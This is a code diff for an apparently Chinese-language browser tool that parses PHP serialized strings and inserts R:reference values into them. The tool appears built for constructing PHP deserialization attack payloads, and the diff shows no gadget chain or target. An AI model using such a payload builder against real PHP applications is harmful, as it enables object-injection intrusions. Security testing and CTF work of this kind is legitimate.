-        const r = readSerializedString(str, startPos);
-        return r ? r.endPos : startPos + 1;
-      }
-      if (type === 'i') {
-        const m = str.slice(startPos).match(/^i:-?\d+;/);
-        return m ? startPos + m[0].length : startPos + 1;
-      }
-      if (type === 'b') {
-        const m = str.slice(startPos).match(/^b:[01];/);
-        return m ? startPos + m[0].length : startPos + 1;
-      }
-      if (type === 'N') return startPos + 2;
-      if (type === 'R' || type === 'r') {
-        const m = str.slice(startPos).match(/^[Rr]:\d+;/);
-        return m ? startPos + m[0].length : startPos + 1;
-      }
-      if (type === 'd') {
-        const m = str.slice(startPos).match(/^d:[^;]+;/);
-        return m ? startPos + m[0].length : startPos + 1;
-      }
-      if (type === 'O') {
-        const m = str.slice(startPos).match(/^O:\d+:"[^"]+":\d+:\{/);
-        if (!m) return startPos + 1;
-        let pos = startPos + m[0].length;
-        let depth = 1;
-        while (pos < str.length && depth > 0) {
-          if (str[pos] === '{') depth++;
-          else if (str[pos] === '}') depth--;
-          pos++;
-        }
-        return pos;
-      }
-      if (type === 'a') {
-        const m = str.slice(startPos).match(/^a:\d+:\{/);
-        if (!m) return startPos + 1;
-        let pos = startPos + m[0].length;
-        let depth = 1;
-        while (pos < str.length && depth > 0) {
-          if (str[pos] === '{') depth++;
-          else if (str[pos] === '}') depth--;
-          pos++;
-        }
-        return pos;
-      }
-      return startPos + 1;
-    }
-
-    function analyzeSerializedProps(str) {
-      // 先将所有转义序列还原为真实字节，让解析器按真实字节计数
-      str = normalizeEscapes(str);
-      const headerMatch = str.match(/O:(\d+):"([^"]+)":(\d+):/);
-      const header = headerMatch ? {
-        byteLen: parseInt(headerMatch[1], 10),
-        className: headerMatch[2],
-        propCount: parseInt(headerMatch[3], 10)
-      } : null;
-
-      const props = [];
-      let pos = headerMatch ? headerMatch.index + headerMatch[0].length : 0;
-      const maxProps = header ? header.propCount : 99;
-
-      for (let i = 0; i < maxProps && pos < str.length; i++) {
-        // 读取属性名 s:N:"name";
-        const nameInfo = readSerializedString(str, pos);
-        if (!nameInfo) break;
-        const rawName = nameInfo.value;
-        pos = nameInfo.endPos;
-
-        // 读取属性值
-        const valStart = pos;
-        pos = skipSerializedValue(str, pos);
-        const valStr = str.slice(valStart, pos);
-
-        // 解析值字节数
-        let valueBytes = 0;
-        const vm = valStr.match(/^s:(\d+):/);
-        if (vm) valueBytes = parseInt(vm[1], 10);
-        else if (valStr.startsWith('i:')) valueBytes = valStr.length;
-        else if (valStr.startsWith('b:')) valueBytes = valStr.length;
-        else if (valStr.startsWith('N;')) valueBytes = 0;
-        else valueBytes = valStr.length;
-
-        // 属性名显示
-        const nameDisplay = rawName.includes("\0")
-          ? rawName.replace(/\0\*\0/g, "(protected)").replace(/\0([^\0]+)\0/g, "(private:$1)").replace(/\0/g, "\\0")
-          : rawName;
-
-        props.push({
-          name: rawName,
-          nameDisplay,
-          nameBytes: nameInfo.valueBytes,
-          valueBytes,
-          valueStr: valStr,
-          totalBytes: nameInfo.valueBytes + valueBytes
-        });
-      }
-      return { header, props };
-    }
-
     function toPhpClass(str) {
       try {
-        const parsed = parseSerialized(str);
+        const parsed = parseSerializedRepairAware(str);
         const result = parsedObjectToPhpClass(parsed);
         if (!result) return "(解析失败)";
         return Array.isArray(result) ? result.join("\n\n") : result;
@@ -3332,177 +4522,286 @@
     });
 
     // --- R:reference ---
-    // PHP 反序列化排号规则：每个对象(O)、数组(a)、字符串(s)都按顺序编号
-    // int(i)、bool(b)、null(N)、引用(R) 不占编号
-    function parseRefPropsRobust(str) {
-      const header = str.match(/O:\d+:"([^"]+)":(\d+):\{/);
-      if (!header) return { flatProps: [], header: null };
-
-      const className = header[1];
-      const declaredCount = parseInt(header[2], 10);
+    // PHP 反序列化排号规则：对象(O)、数组(a)、字符串值(s)按创建顺序获得 R 编号。
+    // 属性名和数组键不作为引用目标；int/bool/null/float/reference 也不创建新编号。
+    function parseRefPropsRobust(input) {
+      const text = realNulls(input).trim();
       const flatProps = [];
-      let globalIdx = 0;
-      let rNumber = 0; // PHP 反序列化 R 编号
+      const targets = [];
+      let nextR = 0;
 
-      function findMatchingBrace(start) {
-        let depth = 1;
-        let p = start;
-        while (p < str.length && depth > 0) {
-          if (str[p] === '{') depth++;
-          else if (str[p] === '}') depth--;
-          p++;
-        }
-        return p;
+      function fail(message, pos) {
+        throw new Error(`${message}（位置 ${pos + 1}）`);
       }
 
-      // 跳过一个值，返回结束位置
-      function skipValue(start) {
-        const ch = str[start];
-        if (ch === 'O') {
-          const m = str.slice(start).match(/^O:\d+:"[^"]+":\d+:\{/);
-          if (m) return findMatchingBrace(start + m[0].length - 1);
-          return start + 1;
+      function skipSpace(pos) {
+        while (pos < text.length && /\s/.test(text[pos])) pos += 1;
+        return pos;
+      }
+
+      function readBytes(pos, byteCount) {
+        const start = pos;
+        let bytes = 0;
+        while (pos < text.length && bytes < byteCount) {
+          const codePoint = text.codePointAt(pos);
+          const size = codePointByteLen(codePoint);
+          if (bytes + size > byteCount) fail("字符串字节长度落在半个字符上", pos);
+          bytes += size;
+          pos += codePoint > 0xFFFF ? 2 : 1;
         }
-        if (ch === 'a') {
-          const m = str.slice(start).match(/^a:\d+:\{/);
-          if (m) return findMatchingBrace(start + m[0].length - 1);
-          return start + 1;
+        if (bytes !== byteCount) fail(`字符串长度不足，期望 ${byteCount} 字节`, start);
+        return { value: text.slice(start, pos), end: pos };
+      }
+
+      function readPhpString(pos, shouldCreateRef, label, depth) {
+        const start = skipSpace(pos);
+        const header = text.slice(start).match(/^s:(\d+):"/);
+        if (!header) fail("需要字符串", start);
+
+        const byteCount = parseInt(header[1], 10);
+        const contentStart = start + header[0].length;
+        const body = readBytes(contentStart, byteCount);
+        let end = body.end;
+        if (text[end] !== '"' || text[end + 1] !== ';') fail("字符串缺少闭合引号或分号", end);
+        end += 2;
+
+        const node = {
+          type: "string",
+          start,
+          end,
+          value: body.value,
+          raw: text.slice(start, end),
+          refId: 0
+        };
+
+        if (shouldCreateRef) {
+          node.refId = registerTarget("string", start, end, label, depth, node.raw);
         }
-        if (ch === 's') {
-          const m = str.slice(start).match(/^s:(\d+):"/);
-          if (m) {
-            const byteCount = parseInt(m[1], 10);
-            let p = start + m[0].length;
-            let bytes = 0;
-            while (p < str.length && bytes < byteCount) {
-              if (str[p] === '\\' && p + 1 < str.length) { p += 2; bytes += 1; }
-              else { p += 1; bytes += 1; }
-            }
-            if (str[p] === '"' && str[p + 1] === ';') return p + 2;
-            const sc = str.indexOf('";', p);
-            return sc >= 0 ? sc + 2 : str.length;
+        return node;
+      }
+
+      function readClassName(pos) {
+        const header = text.slice(pos).match(/^O:(\d+):"/);
+        if (!header) fail("对象头不合法", pos);
+        const byteCount = parseInt(header[1], 10);
+        const contentStart = pos + header[0].length;
+        const body = readBytes(contentStart, byteCount);
+        let end = body.end;
+        if (text[end] !== '"' || text[end + 1] !== ':') fail("对象类名缺少闭合", end);
+        return { className: body.value, end: end + 2 };
+      }
+
+      function registerTarget(type, start, end, label, depth, raw) {
+        const refId = ++nextR;
+        targets.push({
+          r: refId,
+          type,
+          start,
+          end,
+          label,
+          depth,
+          preview: visibleNulls(raw || text.slice(start, end))
+        });
+        return refId;
+      }
+
+      function formatPropName(rawName, className) {
+        if (rawName.startsWith("\0*\0")) return `protected $${rawName.slice(3)}`;
+        if (rawName.startsWith("\0")) {
+          const end = rawName.indexOf("\0", 1);
+          if (end > 0) {
+            const owner = rawName.slice(1, end);
+            const prop = rawName.slice(end + 1);
+            return owner && owner !== className ? `private ${owner}::$${prop}` : `private $${prop}`;
           }
         }
-        if (ch === 'i') { const m = str.slice(start).match(/^i:-?\d+;/); return m ? start + m[0].length : str.length; }
-        if (ch === 'b') { const m = str.slice(start).match(/^b:[01];/); return m ? start + m[0].length : str.length; }
-        if (ch === 'N') return start + 2;
-        if (ch === 'R' || ch === 'r') { const m = str.slice(start).match(/^[Rr]:\d+;/); return m ? start + m[0].length : str.length; }
-        if (ch === 'd') { const m = str.slice(start).match(/^d:[^;]+;/); return m ? start + m[0].length : str.length; }
-        return str.length;
+        return `public $${rawName}`;
       }
 
-      // 解析属性名 s:N:"name"; 并分配 R 编号
-      function readPropName(start) {
-        const m = str.slice(start).match(/^s:(\d+):"((?:\\.|[^"\\])*)";/);
-        if (!m) return null;
-        rNumber++; // 字符串占一个编号
+      function formatArrayKey(key) {
+        if (!key) return "?";
+        if (key.type === "int") return String(key.value);
+        if (key.type === "string") return quoteHumanString(key.value);
+        return visibleNulls(key.raw || "");
+      }
+
+      function pushReplaceable(label, valueNode, depth, owner, kind = "property") {
+        flatProps.push({
+          globalIndex: flatProps.length,
+          nameDisplay: label,
+          valStr: text.slice(valueNode.start, valueNode.end),
+          valR: valueNode.refId || 0,
+          type: valueNode.type,
+          depth,
+          owner,
+          kind,
+          valueStart: valueNode.start,
+          valueEnd: valueNode.end
+        });
+      }
+
+      function readScalar(pos, pattern, type, parser = (raw) => raw) {
+        const start = skipSpace(pos);
+        const match = text.slice(start).match(pattern);
+        if (!match) fail(`${type} 值不合法`, start);
+        const raw = match[0];
         return {
-          rawName: m[2].replace(/\\0/g, '\0'),
-          endPos: start + m[0].length,
-          nameR: rNumber
+          type,
+          start,
+          end: start + raw.length,
+          value: parser(raw),
+          raw,
+          refId: 0
         };
       }
 
-      function parseProps(startPos, maxProps, depth) {
-        let pos = startPos;
-        const props = [];
-        for (let i = 0; i < maxProps && pos < str.length; i++) {
-          while (pos < str.length && /\s/.test(str[pos])) pos++;
-          if (str[pos] === '}' || pos >= str.length) break;
-
-          // 读取属性名（字符串，占一个 R 编号）
-          const nameInfo = readPropName(pos);
-          if (!nameInfo) break;
-          pos = nameInfo.endPos;
-
-          // 读取属性值
-          const valStart = pos;
-          const valEnd = skipValue(pos);
-          const valStr = str.slice(valStart, valEnd);
-          pos = valEnd;
-
-          // 值如果是字符串(O/a/s)也占一个 R 编号
-          let valR = 0;
-          if (valStr[0] === 'O' || valStr[0] === 'a' || valStr[0] === 's') {
-            rNumber++;
-            valR = rNumber;
-          }
-
-          // 解析属性名显示
-          let nameDisplay = nameInfo.rawName;
-          let visibility = "public";
-          if (nameInfo.rawName.startsWith("\0*\0")) { visibility = "protected"; nameDisplay = nameInfo.rawName.slice(3); }
-          else if (nameInfo.rawName.startsWith("\0")) {
-            visibility = "private";
-            const end = nameInfo.rawName.indexOf("\0", 1);
-            if (end > 0) nameDisplay = nameInfo.rawName.slice(end + 1);
-          }
-
-          const prop = {
-            globalIndex: globalIdx++,
-            name: nameInfo.rawName,
-            nameDisplay: `${visibility} $${nameDisplay}`,
-            nameR: nameInfo.nameR,
-            valStr,
-            valR,
-            depth
-          };
-
-          // 嵌套对象 - 递归解析子属性
-          if (str[valStart] === 'O') {
-            const subHeader = valStr.match(/O:\d+:"([^"]+)":\d+:\{/);
-            if (subHeader) {
-              const innerStart = valStart + subHeader[0].length;
-              const propCount = parseInt(str.slice(valStart).match(/O:\d+:"[^"]+":(\d+):/)[1], 10);
-              prop.children = parseProps(innerStart, propCount, depth + 1);
-              prop.valStr = `O:"${subHeader[1]}" (${prop.children.length} props)`;
-            }
-          }
-
-          props.push(prop);
-        }
-        return props;
+      function readKey(pos) {
+        const start = skipSpace(pos);
+        const ch = text[start];
+        if (ch === "s") return readPhpString(start, false, "", 0);
+        if (ch === "i") return readScalar(start, /^i:-?\d+;/, "int", (raw) => parseInt(raw.slice(2, -1), 10));
+        return parseValue(start, "键", 0, false);
       }
 
-      // 根对象本身占一个 R 编号
-      rNumber++;
-      const rootR = rNumber;
+      function parseArray(pos, label, depth, shouldCreateRef) {
+        const start = skipSpace(pos);
+        const header = text.slice(start).match(/^a:(\d+):\{/);
+        if (!header) fail("数组头不合法", start);
 
-      const props = parseProps(header.index + header[0].length, declaredCount, 0);
-      return { flatProps: props, header: { className, propCount: declaredCount, totalR: rNumber, rootR } };
+        const count = parseInt(header[1], 10);
+        const refId = shouldCreateRef ? registerTarget("array", start, start + header[0].length, label, depth, "") : 0;
+        let cursor = start + header[0].length;
+
+        for (let index = 0; index < count; index += 1) {
+          cursor = skipSpace(cursor);
+          if (text[cursor] === "}") break;
+          const key = readKey(cursor);
+          cursor = key.end;
+          const keyLabel = formatArrayKey(key);
+          const itemLabel = `${label}[${keyLabel}]`;
+          const value = parseValue(cursor, itemLabel, depth + 1, true);
+          cursor = value.end;
+          pushReplaceable(itemLabel, value, depth + 1, label, "array-item");
+        }
+
+        cursor = skipSpace(cursor);
+        if (text[cursor] !== "}") fail("数组缺少结束 }", cursor);
+        const end = cursor + 1;
+        const target = targets.find((item) => item.r === refId);
+        if (target) {
+          target.end = end;
+          target.preview = visibleNulls(text.slice(start, end));
+        }
+        return { type: "array", start, end, count, refId, raw: text.slice(start, end) };
+      }
+
+      function parseObject(pos, label, depth, shouldCreateRef) {
+        const start = skipSpace(pos);
+        const classInfo = readClassName(start);
+        const countMatch = text.slice(classInfo.end).match(/^(\d+):\{/);
+        if (!countMatch) fail("对象属性数量不合法", classInfo.end);
+
+        const className = classInfo.className;
+        const count = parseInt(countMatch[1], 10);
+        const objectLabel = label || className;
+        const headerEnd = classInfo.end + countMatch[0].length;
+        const refId = shouldCreateRef ? registerTarget("object", start, headerEnd, objectLabel, depth, "") : 0;
+        let cursor = headerEnd;
+
+        for (let index = 0; index < count; index += 1) {
+          cursor = skipSpace(cursor);
+          if (text[cursor] === "}") break;
+          const key = readPhpString(cursor, false, "", depth);
+          cursor = key.end;
+          const propLabel = `${className}.${formatPropName(key.value, className)}`;
+          const value = parseValue(cursor, propLabel, depth + 1, true);
+          cursor = value.end;
+          pushReplaceable(propLabel, value, depth + 1, className, "property");
+        }
+
+        cursor = skipSpace(cursor);
+        if (text[cursor] !== "}") fail("对象缺少结束 }", cursor);
+        const end = cursor + 1;
+        const target = targets.find((item) => item.r === refId);
+        if (target) {
+          target.end = end;
+          target.preview = visibleNulls(text.slice(start, end));
+        }
+        return { type: "object", start, end, className, count, refId, raw: text.slice(start, end) };
+      }
+
+      function parseValue(pos, label, depth, shouldCreateRef = true) {
+        const start = skipSpace(pos);
+        const type = text[start];
+        if (type === "s") return readPhpString(start, shouldCreateRef, label, depth);
+        if (type === "a") return parseArray(start, label, depth, shouldCreateRef);
+        if (type === "O") return parseObject(start, label, depth, shouldCreateRef);
+        if (type === "i") return readScalar(start, /^i:-?\d+;/, "int", (raw) => parseInt(raw.slice(2, -1), 10));
+        if (type === "b") return readScalar(start, /^b:[01];/, "bool", (raw) => raw[2] === "1");
+        if (type === "N") return readScalar(start, /^N;/, "null", () => null);
+        if (type === "d") return readScalar(start, /^d:[^;]+;/, "float", (raw) => Number(raw.slice(2, -1)));
+        if (type === "R" || type === "r") return readScalar(start, /^[Rr]:\d+;/, "reference", (raw) => parseInt(raw.slice(2, -1), 10));
+        fail(`暂不支持的类型：${type || "空"}`, start);
+      }
+
+      try {
+        if (!text) return { flatProps: [], header: null, targets: [], text };
+        const root = parseValue(0, "root", 0, true);
+        flatProps.sort((a, b) => a.valueStart - b.valueStart);
+        flatProps.forEach((prop, index) => prop.globalIndex = index);
+        targets.sort((a, b) => a.r - b.r);
+        return {
+          flatProps,
+          targets,
+          text,
+          header: {
+            className: root.className || root.type,
+            propCount: root.count || 0,
+            totalR: nextR,
+            rootR: root.refId || 0
+          }
+        };
+      } catch (error) {
+        return { flatProps, targets, text, header: null, error: error.message };
+      }
     }
 
-    function renderRefProps(flatProps, totalR) {
+    function renderRefProps(flatProps, totalR, errorMessage = "") {
       const container = $("#ref-prop-list");
       container.innerHTML = "";
+      if (errorMessage) {
+        const err = document.createElement("p");
+        err.className = "note ref-error";
+        err.textContent = `解析失败：${errorMessage}`;
+        container.appendChild(err);
+        return;
+      }
       if (flatProps.length === 0) {
-        container.innerHTML = '<p class="note">未能解析出属性</p>';
+        container.innerHTML = '<p class="note">未能解析出可替换的属性或数组项</p>';
         return;
       }
       if (totalR > 0) {
         const hint = document.createElement("p");
         hint.className = "note";
         hint.style.marginBottom = "8px";
-        hint.innerHTML = `R编号: <strong>R:1</strong> ~ <strong>R:${totalR}</strong>（按反序列化顺序），勾选属性后选择引用目标`;
+        hint.innerHTML = `可引用编号: <strong>R:1</strong> ~ <strong>R:${totalR}</strong>。先勾选要替换的值，再选择它要指向的已创建目标。`;
         container.appendChild(hint);
       }
       flatProps.forEach(p => {
-        const indent = "  ".repeat(p.depth);
-        const hasChildren = p.children && p.children.length > 0;
         const row = document.createElement("div");
-        row.className = "count-row";
-        row.style.gridTemplateColumns = "auto auto 1fr auto";
-        const rTag = p.valR ? `<span style="font:11px var(--mono);color:var(--accent-strong);background:var(--accent-soft);padding:1px 5px;border-radius:3px;margin-left:4px;">R:${p.valR}</span>` : "";
+        const typeLabel = p.valR ? `R:${p.valR}` : p.type;
+        row.className = "count-row ref-prop-row";
+        row.style.setProperty("--ref-depth", String(p.depth));
         row.innerHTML =
-          `<input type="checkbox" name="ref-prop" value="${p.globalIndex}" class="ref-check" data-name="${p.nameDisplay}" data-r="${p.valR || 0}" style="accent-color:var(--accent);">` +
-          `<span class="count-class" title="${p.valStr}">${indent}${hasChildren ? "[+]" : "  "} ${p.nameDisplay}</span>` +
-          `${rTag}` +
-          `<span style="font:12px var(--mono);color:var(--muted);max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${p.valStr}">${visibleNulls(p.valStr)}</span>`;
+          `<input type="checkbox" name="ref-prop" value="${p.globalIndex}" class="ref-check" data-name="${escapeHtml(p.nameDisplay)}" data-r="${p.valR || 0}" style="accent-color:var(--accent);">` +
+          `<span class="count-class" title="${escapeHtml(p.nameDisplay)}">${escapeHtml(p.nameDisplay)}</span>` +
+          `<span class="ref-badge">${escapeHtml(typeLabel)}</span>` +
+          `<span class="ref-preview" title="${escapeHtml(visibleNulls(p.valStr))}">${escapeHtml(visibleNulls(p.valStr))}</span>`;
         container.appendChild(row);
       });
     }
 
-    function renderRefTargets(flatProps, totalR) {
+    function renderRefTargets(flatProps, totalR, targets = []) {
       const container = $("#ref-targets");
       container.innerHTML = "";
       const checked = $$('.ref-check:checked');
@@ -3513,52 +4812,70 @@
       checked.forEach(cb => {
         const idx = parseInt(cb.value, 10);
         const name = cb.dataset.name;
+        const prop = flatProps.find((item) => item.globalIndex === idx);
+        const candidates = targets.filter((target) => prop && target.start < prop.valueStart);
         const row = document.createElement("div");
-        row.className = "count-row";
-        row.style.gridTemplateColumns = "1fr auto";
+        row.className = "count-row ref-target-row";
         const maxR = totalR || 99;
-        row.innerHTML =
-          `<span style="font:13px var(--sans);color:var(--ink);">${name} -> R:</span>` +
-          `<input type="number" class="ref-r-value" data-idx="${idx}" value="1" min="1" max="${maxR}" style="width:80px;">`;
+        if (candidates.length > 0) {
+          const options = candidates.map((target) => {
+            const label = `R:${target.r} · ${target.type} · ${target.label}`;
+            return `<option value="${target.r}">${escapeHtml(label)}</option>`;
+          }).join("");
+          row.innerHTML =
+            `<span class="ref-target-name">${escapeHtml(name)} -></span>` +
+            `<select class="ref-r-value" data-idx="${idx}">${options}</select>`;
+        } else {
+          row.innerHTML =
+            `<span class="ref-target-name">${escapeHtml(name)} -> R:</span>` +
+            `<input type="number" class="ref-r-value" data-idx="${idx}" value="1" min="1" max="${maxR}" style="width:96px;">`;
+        }
         container.appendChild(row);
       });
     }
 
     let refLastFlatProps = [];
     let refLastTotalR = 0;
+    let refLastTargets = [];
+    let refLastSource = "";
+
+    function applyRefParseResult(result) {
+      refLastFlatProps = result.flatProps || [];
+      refLastTotalR = result.header ? result.header.totalR : 0;
+      refLastTargets = result.targets || [];
+      refLastSource = result.text || "";
+      renderRefProps(refLastFlatProps, refLastTotalR, result.error || "");
+      renderRefTargets(refLastFlatProps, refLastTotalR, refLastTargets);
+      return result;
+    }
 
     $("#ref-load-output").addEventListener("click", () => {
       const payload = getOutputReal();
       if (!payload) { alert("输出区为空"); return; }
       $("#ref-source").value = visibleNulls(payload);
       const result = parseRefPropsRobust(payload);
-      refLastFlatProps = result.flatProps;
-      refLastTotalR = result.header ? result.header.totalR : 0;
-      renderRefProps(result.flatProps, refLastTotalR);
-      renderRefTargets(result.flatProps, refLastTotalR);
+      applyRefParseResult(result);
     });
 
     $("#ref-parse").addEventListener("click", () => {
       const str = $("#ref-source").value;
       if (!str.trim()) { alert("请先粘贴序列化串"); return; }
       const result = parseRefPropsRobust(str);
-      refLastFlatProps = result.flatProps;
-      refLastTotalR = result.header ? result.header.totalR : 0;
-      renderRefProps(result.flatProps, refLastTotalR);
-      renderRefTargets(result.flatProps, refLastTotalR);
+      applyRefParseResult(result);
     });
 
     // 勾选变化时更新引用目标
     document.addEventListener("change", (e) => {
       if (e.target.classList.contains("ref-check")) {
-        renderRefTargets(refLastFlatProps, refLastTotalR);
+        renderRefTargets(refLastFlatProps, refLastTotalR, refLastTargets);
       }
     });
 
     // 执行替换
     $("#insert-ref").addEventListener("click", () => {
-      const str = $("#ref-source").value.trim();
+      const str = realNulls($("#ref-source").value).trim();
       if (!str) { alert("请先输入序列化串"); return; }
+      if (str !== refLastSource) { alert("序列化串已变化，请先点击「解析属性」"); return; }
 
       const checked = $$('.ref-check:checked');
       if (checked.length === 0) { alert("请勾选要替换的属性"); return; }
@@ -3571,43 +4888,55 @@
         const rVal = rInput ? parseInt(rInput.value, 10) || 1 : 1;
         const prop = refLastFlatProps.find(p => p.globalIndex === idx);
         if (!prop) return;
+        if (rVal < 1 || rVal > refLastTotalR) return;
         replacements.push({ prop, rVal, refStr: `R:${rVal};` });
       });
+      if (replacements.length === 0) { alert("没有有效的引用目标"); return; }
+
+      const orderedRanges = replacements.slice().sort((a, b) => a.prop.valueStart - b.prop.valueStart);
+      for (let i = 1; i < orderedRanges.length; i += 1) {
+        const prev = orderedRanges[i - 1].prop;
+        const curr = orderedRanges[i].prop;
+        if (prev.valueEnd > curr.valueStart) {
+          alert("勾选的字段存在父子嵌套重叠，请分两次替换，避免误改 Payload。");
+          return;
+        }
+      }
 
       // 从后往前替换（避免索引偏移）
       let result = str;
       const details = [];
-      for (let i = replacements.length - 1; i >= 0; i--) {
-        const { prop, refStr } = replacements[i];
-        const oldVal = prop.valStr;
-        if (oldVal.startsWith('R:') && oldVal === refStr) { details.push(`${prop.nameDisplay}: 已是 ${refStr}，跳过`); continue; }
-        const pos = result.lastIndexOf(oldVal);
-        if (pos < 0) { details.push(`${prop.nameDisplay}: 未找到 ${oldVal}`); continue; }
-        result = result.slice(0, pos) + refStr + result.slice(pos + oldVal.length);
-        details.push(`${prop.nameDisplay}: ${oldVal} -> ${refStr}`);
-      }
+      replacements
+        .sort((a, b) => b.prop.valueStart - a.prop.valueStart)
+        .forEach(({ prop, refStr }) => {
+          const oldVal = result.slice(prop.valueStart, prop.valueEnd);
+          if (oldVal === refStr) {
+            details.push(`${prop.nameDisplay}: 已是 ${refStr}，跳过`);
+            return;
+          }
+          result = result.slice(0, prop.valueStart) + refStr + result.slice(prop.valueEnd);
+          details.push(`${prop.nameDisplay}: ${visibleNulls(oldVal)} -> ${refStr}`);
+        });
 
       const box = $("#ref-diff-box");
       box.classList.remove("hidden");
-      $("#ref-output").value = result;
+      $("#ref-details").textContent = details.join("\n");
+      $("#ref-output").value = visibleNulls(result);
       setConstructOutput(result);
     });
 
     $("#ref-copy").addEventListener("click", () => {
       const val = $("#ref-output").value;
       if (!val) { alert("没有可复制的内容"); return; }
-      copyText(val, "#ref-output");
+      copyText(realNulls(val), "#ref-output");
     });
 
     $("#ref-reinput").addEventListener("click", () => {
-      const val = $("#ref-output").value;
+      const val = realNulls($("#ref-output").value);
       if (!val) { alert("没有内容可放回"); return; }
-      $("#ref-source").value = val;
+      $("#ref-source").value = visibleNulls(val);
       const result = parseRefPropsRobust(val);
-      refLastFlatProps = result.flatProps;
-      refLastTotalR = result.header ? result.header.totalR : 0;
-      renderRefProps(result.flatProps, refLastTotalR);
-      renderRefTargets(result.flatProps, refLastTotalR);
+      applyRefParseResult(result);
     });
 
     // --- 发送为URL查询新参数 ---
